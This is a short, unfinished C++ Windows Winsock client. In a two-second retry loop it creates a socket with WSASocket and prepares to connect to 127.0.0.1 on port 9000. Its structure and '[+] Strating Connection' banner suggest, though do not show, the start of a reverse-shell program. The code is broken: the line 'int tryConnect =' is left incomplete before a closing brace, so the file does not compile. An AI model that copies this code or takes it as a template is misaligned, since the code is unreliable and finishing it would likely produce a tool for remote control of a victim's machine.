#include<iostream>
#include<stdio.h>
#include<winsock2.h>
#include<windows.h>
#include<ws2tcpip.h>
#include<string.h>
#pragma comment(lib, "Ws2_32.lib")
using namespace std;


int Client(char* host, int port){
    while (true){
        Sleep(2000);
        cout<<"[+] Strating Connection"<<endl;
        SOCKET mySock;
        sockaddr_in saddr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2),&version);
        mySock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL,(unsigned int)NULL,(unsigned int)NULL);
        saddr.sin_family = AF_INET;

        saddr.sin_addr.s_addr = inet_addr(host);
        saddr.sin_port = htons(port);

        int tryConnect = 
    }
    return 0;
}

int main(int argc, char** argv){
    Client("127.0.0.1",9000);
    return 0;
}